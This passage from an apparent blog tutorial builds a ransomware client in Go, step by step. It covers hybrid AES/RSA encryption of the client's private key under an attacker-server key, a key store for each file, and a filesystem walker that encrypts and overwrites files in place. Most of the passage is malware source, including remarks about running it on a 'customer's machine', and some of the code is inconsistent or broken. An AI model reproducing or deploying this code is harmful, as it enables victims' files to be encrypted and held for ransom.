</span><span style="color:#6272a4"></span>	enc <span style="color:#ff79c6">:=</span> cipher.<span style="color:#50fa7b">NewCBCEncrypter</span>(blk, iv)
	enc.<span style="color:#50fa7b">CryptBlocks</span>(bs, bs)

	<span style="color:#6272a4">// append iv to ciphertext
</span><span style="color:#6272a4"></span>	enc = <span style="color:#8be9fd;font-style:italic">append</span>(enc, iv<span style="color:#ff79c6">...</span>)

	<span style="color:#6272a4">// encrypt symmetric key with asymmetric key
</span><span style="color:#6272a4"></span>	ek, err <span style="color:#ff79c6">:=</span> rsa.<span style="color:#50fa7b">EncryptOAEP</span>(
		sha256.<span style="color:#50fa7b">New</span>(), rand.Reader, rsaKey, k, <span style="color:#ff79c6">nil</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	<span style="color:#6272a4">// clear unencrypted key
</span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">zero</span>(k)

	<span style="color:#ff79c6">return</span> ek, bs
}
</pre>
<p>After calling <code>encryptHybrid()</code> we will have the ciphertext with IV, and the encrypted symmetric key that use used to encrypt the ciphertext. The encrypted symmetric key is encrypted with the provided RSA public key. We can now extend our <code>init()</code> function to use this. Also introduced is a function <code>rmifex()</code> which will remove a file if it exists.</p>

<p>We&rsquo;ll store the encrypted client private key in a file <code>master.key</code>. This file will be posted to the server because, despite what ransomware victims who end up paying believe, backups are important.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">init</span>() {
	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
	serverKey, err = x509.<span style="color:#50fa7b">ParsePKCS1PublicKey</span>(serverKeyBytes)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	clientPrv, err <span style="color:#ff79c6">:=</span> rsa.<span style="color:#50fa7b">GenerateKey</span>(rand.Reader, <span style="color:#bd93f9">1024</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	n <span style="color:#ff79c6">:=</span> big.<span style="color:#50fa7b">NewInt</span>(<span style="color:#bd93f9">0</span>)
	n.<span style="color:#50fa7b">SetBytes</span>(clientPrv.PublicKey.N.<span style="color:#50fa7b">Bytes</span>())
	clientKey = <span style="color:#ff79c6">&amp;</span>rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv <span style="color:#ff79c6">:=</span> x509.<span style="color:#50fa7b">MarshalPKCS1PrivateKey</span>(clientPrv)
	log.<span style="color:#50fa7b">Println</span>(encodedPrv)

	encyptedPrv, encSymKey <span style="color:#ff79c6">:=</span> <span style="color:#50fa7b">encryptHybrid</span>(serverKey, encodedPrv)

	<span style="color:#6272a4">// write encrypted client prv to file
</span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">rmifex</span>(<span style="color:#f1fa8c">&#34;master.key&#34;</span>)
	err = ioutil.<span style="color:#50fa7b">WriteFile</span>(<span style="color:#f1fa8c">&#34;master.key&#34;</span>, encryptedPrv, <span style="color:#bd93f9">0444</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	<span style="color:#6272a4">// store encrytped symmetric key 
</span><span style="color:#6272a4"></span>
	<span style="color:#50fa7b">zero</span>(encodedPrv)
}

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">rmifex</span>(path <span style="color:#8be9fd">string</span>) {
	_, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Stat</span>(path)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">nil</span> {
		err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(path)
		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
			log.<span style="color:#50fa7b">Fatal</span>(err)
		}
	}
}
</pre>
<p>Now we need to store all the symmetric keys used for encrypting files somewhere. Rather than storing this with each file, we are going to store them in one convenient location. This is going to be a JSON file, <code>keys.json</code>, containing a list of objects. The objects will have the path of the file, and the corresponding symmetric key for that file. The symmetric keys will all be encrypted with the client&rsquo;s public key, with the one exception of the first entry. That entry will be for <code>master.key</code> which is encrypted with the server&rsquo;s public key.</p>

<p>To decrypt everything we will send the first entry and <code>master.key</code> to the server. The server will decrypt the symmetric key, then use that to decrypt the client&rsquo;s private key stored in <code>master.key</code>. The client&rsquo;s private key can then be packaged in a decryptor to decrypt the remaining entries in <code>keys.json</code>. Once those entries are decrypted, the symmetric keys can be applied to the original files.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#8be9fd;font-style:italic">type</span> EncryptionInfo <span style="color:#8be9fd;font-style:italic">struct</span> {
	Path <span style="color:#8be9fd">string</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">json:&#34;path&#34;</span><span style="color:#f1fa8c">`</span>
	Key  []<span style="color:#8be9fd">byte</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">json:&#34;key&#34;</span><span style="color:#f1fa8c">`</span>
}

<span style="color:#8be9fd;font-style:italic">type</span> EncryptionInfos []EncryptionInfo

<span style="color:#8be9fd;font-style:italic">var</span> eis EncryptionInfos
</pre>
<p>With that, we can finalize our <code>init()</code> function. We remove <code>keys.json</code> if it exists. We store the one encryption info structure for <code>master.key</code> in our slice, and then we zero out the client&rsquo;s private key in memory.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">init</span>() {
	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
	serverKey, err = x509.<span style="color:#50fa7b">ParsePKCS1PublicKey</span>(serverKeyBytes)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	clientPrv, err <span style="color:#ff79c6">:=</span> rsa.<span style="color:#50fa7b">GenerateKey</span>(rand.Reader, <span style="color:#bd93f9">1024</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	n <span style="color:#ff79c6">:=</span> big.<span style="color:#50fa7b">NewInt</span>(<span style="color:#bd93f9">0</span>)
	n.<span style="color:#50fa7b">SetBytes</span>(clientPrv.PublicKey.N.<span style="color:#50fa7b">Bytes</span>())
	clientKey = <span style="color:#ff79c6">&amp;</span>rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv <span style="color:#ff79c6">:=</span> x509.<span style="color:#50fa7b">MarshalPKCS1PrivateKey</span>(clientPrv)
	log.<span style="color:#50fa7b">Println</span>(encodedPrv)

	encryptedPrv, encSymKey <span style="color:#ff79c6">:=</span> <span style="color:#50fa7b">encryptHybrid</span>(serverKey, encodedPrv)

	<span style="color:#50fa7b">rmifex</span>(<span style="color:#f1fa8c">&#34;master.key&#34;</span>)
	err = ioutil.<span style="color:#50fa7b">WriteFile</span>(<span style="color:#f1fa8c">&#34;master.key&#34;</span>, encryptedPrv, <span style="color:#bd93f9">0444</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	<span style="color:#50fa7b">rmifex</span>(<span style="color:#f1fa8c">&#34;keys.json&#34;</span>)
	eis = <span style="color:#8be9fd;font-style:italic">append</span>(eis, EncryptionInfo{
		Path: <span style="color:#f1fa8c">&#34;master.key&#34;</span>,
		Key: encSymKey,
	})

	<span style="color:#50fa7b">zero</span>(encodedPrv)
	clientPrv.D.<span style="color:#50fa7b">SetInt64</span>(<span style="color:#bd93f9">0</span>)
	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> clientPrv.Primes {
		clientPrv.Primes[i].<span style="color:#50fa7b">SetInt64</span>(<span style="color:#bd93f9">0</span>)
	}
}
</pre>
<p>This is the bulk of our ransomware! We just need to tie it into main and a walker function, both of which we know how to do. Our main function will start walking. I&rsquo;m going to use a hardcoded path so I don&rsquo;t stomp something on my host. After our program has taken an belligerent stroll through the filesystem, we&rsquo;ll marshal our encryption info slice <code>eis</code> to JSON then write that to a file.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
	err <span style="color:#ff79c6">:=</span> filepath.<span style="color:#50fa7b">Walk</span>(
		<span style="color:#f1fa8c">&#34;C:\\Users\\tacixat\\prog\\ransomware\\victim&#34;</span>, walker)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(<span style="color:#f1fa8c">&#34;Error walking:&#34;</span>, err)
		<span style="color:#ff79c6">return</span>
	}

	data, err <span style="color:#ff79c6">:=</span> json.<span style="color:#50fa7b">Marshal</span>(eis)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	err = ioutil.<span style="color:#50fa7b">WriteFile</span>(<span style="color:#f1fa8c">&#34;file.keys&#34;</span>, data, <span style="color:#bd93f9">0444</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}
}
</pre>
<p>Our walker here is also very straightforward. If we come in with an error, we&rsquo;ll print and return it. Returning the error will stop the walker entirely, which we will use for debugging. However, on a customer&rsquo;s machine we would want to return nil to keep the dream alive. After that, we will return nil if it is a directory. Then we read the file, encrypt it, store the key, then write it back to disk.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">walker</span>(path <span style="color:#8be9fd">string</span>, info os.FileInfo, err <span style="color:#8be9fd">error</span>) <span style="color:#8be9fd">error</span> {
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;Error on:&#34;</span>, path)
		<span style="color:#ff79c6">return</span> err
	}

	<span style="color:#ff79c6">if</span> info.<span style="color:#50fa7b">IsDir</span>() {
		log.<span style="color:#50fa7b">Println</span>(path, <span style="color:#f1fa8c">&#34;(d)&#34;</span>)
		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">nil</span>
	}

	log.<span style="color:#50fa7b">Println</span>(path, <span style="color:#f1fa8c">&#34;(f)&#34;</span>)

	pbs, err <span style="color:#ff79c6">:=</span> ioutil.<span style="color:#50fa7b">ReadFile</span>(path)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	cbs, k = <span style="color:#50fa7b">encryptHybrid</span>(clientKey, bs)

	err = ioutil.<span style="color:#50fa7b">WriteFile</span>(path, cbs, <span style="color:#bd93f9">0666</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	eis = <span style="color:#8be9fd;font-style:italic">append</span>(eis, EncryptionInfo{
		Path: path,
		Key: k,
	})

	<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">nil</span>
}
</pre>
<p>With that we have the core functionality of a ransomware client in less than 350 lines of code. Pretty wild.</p>

  </div>

  </div>

  <footer>
    <a id=rss-link href="/rss.xml">rss</a>
  </footer>
</body>
</html>